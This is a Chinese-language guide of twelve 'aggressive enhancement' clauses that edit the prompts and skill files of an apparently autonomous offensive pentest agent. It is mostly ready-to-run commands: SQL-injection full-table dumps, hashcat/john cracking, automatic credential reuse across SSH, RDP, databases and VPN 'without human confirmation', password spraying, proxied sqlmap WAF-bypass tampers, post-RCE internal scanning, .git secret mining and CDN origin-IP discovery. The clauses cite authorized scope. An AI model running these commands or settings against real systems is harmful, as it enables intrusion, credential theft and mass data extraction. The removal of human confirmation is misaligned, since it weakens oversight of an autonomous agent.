# 可选激进化增强条款 (12 条)

每条独立可启用。启用方式、适用场景、风险提示如下。

---

## 1. 默认全表 dump (SoW 范围内)

**启用方式**: 在 `roles/offensive-harvester.yaml` 的 `user_prompt` 中,找到 `[SQLi]` 链,将数据梯度改为:

```
数据梯度:SoW范围内默认全量dump。<1万行全量直出;1-10万行分批dump全量;>10万行抽10000+总量+schema完整导出。
```

**适用场景**: SoW 明确允许全量数据提取的授权测试。
**风险提示**: 数据量大时耗时长、日志庞大;确保存储空间充足;客户报告中只展示样本,全量数据单独加密交付。

---

## 2. hash 离线匹配 rockyou.txt + 弱口令 top1000

**启用方式**: 在 `skills/credential-spray-reuse/SKILL.md` 的 hash 破解步骤后追加:

```markdown
### 离线 hash 匹配 (增强)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force -O -w 3
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt --force -O -w 3
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt --force -O -w 3
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt hashes.txt
超时限制: 单轮 hashcat 最长 30 分钟,john 最长 15 分钟。
```

**适用场景**: 提取到密码 hash 且需评估密码强度。
**风险提示**: GPU 资源消耗大;设置超时避免无限运行。

---

## 3. 提取凭据自动跨资产复用回测

**启用方式**: 在 `roles/offensive-harvester.yaml` 的 `user_prompt` 中 `[弱口令]` 链后追加:

```
凭据复用自动化:命中任意凭据→立即在所有已发现资产(SSH/RDP/MySQL/PostgreSQL/Redis/MongoDB/Web后台/VPN/FTP)自动回测,不等待人工确认。
```

**适用场景**: SoW 覆盖全资产的授权测试。
**风险提示**: 可能触发多资产告警;确保 SoW 范围覆盖所有被回测资产。

---

## 4. API Key 自动测真实权限边界 (纯只读探测)

**启用方式**: 在 `skills/credential-spray-reuse/SKILL.md` 的 API Key 章节追加:

```markdown
### API Key 权限边界自动探测 (只读)
AWS: sts get-caller-identity → iam list-users → s3 ls → ec2 describe-instances → rds describe-db-instances → lambda list-functions
阿里云: DescribeRegions → DescribeInstances → ListBuckets → DescribeDBInstances
腾讯云: DescribeRegions → DescribeInstances → GetBucketList
GCP: projects.list → compute.instances.list → storage.buckets.list
Azure: subscriptions/list → resourceGroups/list → virtualMachines/list
所有调用严格只读(GET/Describe/List),不执行任何写操作。
```

**适用场景**: 提取到云凭据后评估影响范围。
**风险提示**: 即使只读也会在云审计日志中留痕;确保 SoW 允许云 API 调用。

---

## 5. 内网入口自动 C 段 nmap / masscan

**启用方式**: 在 `skills/rce-post-exploitation/SKILL.md` 的内网扫描章节追加:

```markdown
### 内网 C 段自动扫描 (增强)
获得 RCE 后自动扫描当前网段 /24:
masscan CURRENT_SUBNET/24 -p 22,80,443,3306,5432,6379,8080,9200,27017,2375,8500,2181,11211 --rate 500
nmap -sT -sV -p 22,80,443,3306,5432,6379 TOP_ALIVE_HOSTS -oN /tmp/internal_scan.txt
```

**适用场景**: 获得内网立足点后的横向扫描。
**风险提示**: 内网扫描可能触发 IDS/IPS;控制扫描速率;确认 SoW 允许横向。

---

## 6. Git 仓库自动 commit 历史挖凭据

**启用方式**: 在 `skills/sensitive-info-leakage/SKILL.md` 的 Git 泄露章节追加:

```markdown
### Git commit 历史凭据挖掘 (增强)
发现 .git 泄露后:
1. 完整下载 .git 目录 (git-dumper 或手工)
2. git log --all --oneline | head -100
3. git log --all -p | grep -iE 'password|secret|api_key|token|private_key|access_key' | head -200
4. git diff HEAD~50..HEAD | grep -iE 'password|secret|api_key'
5. 检查 .gitignore 中列出但 commit 历史中存在的文件
```

**适用场景**: 发现 .git 目录泄露后深度提取。
**风险提示**: 下载完整仓库耗时;大仓库可能占用大量存储。

---

## 7. OSS/S3 bucket 自动 ACL 测试

**启用方式**: 在 `skills/sensitive-info-leakage/SKILL.md` 末尾追加:

```markdown
### 云存储 ACL 测试 (增强)
发现 S3/OSS bucket 后:
aws s3 ls s3://BUCKET --no-sign-request 2>/dev/null && echo "PUBLIC_READ"
aws s3 cp s3://BUCKET/test_write_check /tmp/ --no-sign-request 2>/dev/null
curl -sk "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/?list-type=2&max-keys=100"
curl -sk "https://BUCKET.s3.amazonaws.com/?list-type=2&max-keys=100"
仅测试读权限和列举权限,不写入不删除。
```

**适用场景**: 发现云存储相关资产后。
**风险提示**: 仅做只读探测;不上传/删除任何文件。

---

## 8. 子域名自动批量喂回 nuclei 全模板

**启用方式**: 在 `agents/recon-hunter.md` 工作流第七步后追加:

```markdown
## 第八步: 子域名批量回喂 nuclei
cat /tmp/alive_subs.txt | nuclei -severity critical,high,medium -silent -c 20 -rl 100 -o /tmp/nuclei_subdomain_results.txt
# 代理版
cat /tmp/alive_subs.txt | nuclei -severity critical,high,medium -silent -c 10 -rl 50 -proxy http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000 -o /tmp/nuclei_subdomain_results.txt
```

**适用场景**: 子域名枚举完成后全量漏洞扫描。
**风险提示**: 子域名数量大时耗时极长;控制并发和速率;确认所有子域名在 SoW 范围内。

---

## 9. JS 文件正则提取 endpoint/AK SK 回测

**启用方式**: 在 `skills/sensitive-info-leakage/SKILL.md` 的 JS 提取章节追加:

```markdown
### JS 提取结果自动回测 (增强)
提取的 endpoint 自动回喂:
cat /tmp/js_endpoints.txt | httpx -silent -status-code -content-length | grep "200" > /tmp/live_endpoints.txt
cat /tmp/live_endpoints.txt | nuclei -severity critical,high -silent
cat /tmp/live_endpoints.txt | arjun -i - -oT /tmp/arjun_params.txt

提取的 AK/SK 自动验证:
对 AKIA 开头的 key: aws sts get-caller-identity
对阿里云格式 key: 调用 DescribeRegions
```

**适用场景**: JS 文件分析发现大量 endpoint 和凭据后。
**风险提示**: 大量 endpoint 回测可能触发 WAF;分批 + 降速。

---

## 10. 登录接口自动用户名枚举 + 密码喷洒

**启用方式**: 在 `skills/credential-spray-reuse/SKILL.md` 的密码喷洒章节改为默认启用:

```markdown
### 自动密码喷洒 (scope 允许时,默认启用)
1. 用户名枚举: 响应差异 / 时间差异 / 注册接口回显
2. TOP 20 密码喷洒: 123456 / password / admin123 / qwerty / abc123 / 111111 / admin / letmein / welcome / monkey / 1234567890 / master / dragon / login / 888888 / 666666 / 123123 / iloveyou / sunshine / princess
3. 间隔: 每用户每密码 5-15 秒 (经代理)
4. 锁定检测: 每 5 次尝试后检查账户是否被锁
```

**适用场景**: SoW 允许登录爆破的授权测试。
**风险提示**: 可能触发账户锁定;走代理慢速;监控锁定状态。

---

## 11. WAF 绕过激进化: sqlmap tamper 全集穷举

**启用方式**: 在 `skills/sqli-deep-exploitation/SKILL.md` 的 WAF 对抗章节追加:

```markdown
### tamper 穷举模式 (Level 5 增强)
常规 tamper 组合失败后,启用穷举:
sqlmap -u "URL" --batch --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,commalesslimit,commalessmid,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --random-agent --delay 5 --threads 1 --proxy="socks5://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000"
```

**适用场景**: 常规 tamper 组合全部失败,WAF 极其严格。
**风险提示**: 速度极慢 (单线程 + 5s 延迟);可能需要数小时;确认有足够时间。

---

## 12. 源站发现激进化: 多引擎反查 Cloudflare 源站 IP

**启用方式**: 在 `skills/sensitive-info-leakage/SKILL.md` 的源站发现章节追加:

```markdown
### 源站发现激进化 (增强)
多维度源站 IP 反查:
1. DNS 历史: SecurityTrails / ViewDNS / DNSHistory (通过 curl API 或已集成搜索工具)
2. SSL 证书: crt.sh → 提取所有证书关联域名 → 解析 IP → 排除 CDN IP
3. 邮件头: 触发注册/密码重置邮件 → 提取 Received 头中的 IP
4. favicon hash: curl favicon → md5 → 在 FOFA/Shodan 搜索 icon_hash
5. 子域名 IP 比对: 非 CDN 子域名 (mail./ftp./cpanel.) 可能暴露源站
6. HTML/JS 内容: 搜索硬编码 IP / 内部域名 / 源站 API 地址
7. SPF 记录: dig TXT TARGET_DOMAIN | grep spf → 提取 ip4/ip6
8. 历史 WHOIS: 旧注册信息可能包含源站 ISP
验证: curl --resolve TARGET_DOMAIN:443:SUSPECTED_IP https://TARGET_DOMAIN/ → 对比 CDN 响应一致性
```

**适用场景**: 目标使用 Cloudflare/CDN 且需要绕过。
**风险提示**: 部分查询需要第三方 API;确保仅用 CyberStrikeAI 已集成能力或 curl 可达的公开 API。
